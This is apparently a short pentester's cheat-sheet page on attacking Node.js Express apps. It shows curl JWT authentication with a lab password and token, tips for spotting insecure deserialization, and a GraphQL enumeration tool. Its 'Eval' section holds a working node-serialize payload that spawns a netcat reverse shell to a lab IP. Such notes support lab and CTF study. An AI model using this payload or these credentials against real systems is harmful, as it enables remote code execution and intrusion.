<!-- TITLE: 13 - Web Technologies -->
<!-- SUBTITLE: A quick summary of 13 Web Technologies -->

# Node.JS Express

## Authentication

### JSON Web Tokens (JWT)

Here we use `curl` to authenticate to the `/login` endpoint to obtain a token

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"usern
ame":"admin","password":"Zk6heYCyv6ZE9Xcg"}' http://10.10.10.137:3000/login
```

Subsequent request with Authorization header and bearer token:

```
curl -H 'Accept: application/json' -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDI1OTU5LCJleHAiOjE1NTkxMTIzNTl9._OLUZOeTHP5wjEpQCp8MCtur2Eh689HVLNc1yk82b2U" http://10.10.10.137:3000/users | jq
```

## Serialization

### Detection

- Check for JSON response
- Base64 decode
- Swap JSON value from int to unquoted string, or string to integer and check for error


### Eval

```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f', function(error, stdout, stderr) {console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"}
```

## Frameworks

### GraphQL

- GraphQL_Introspection.py: A useful tool to enumerate GraphQL queries/endpoints
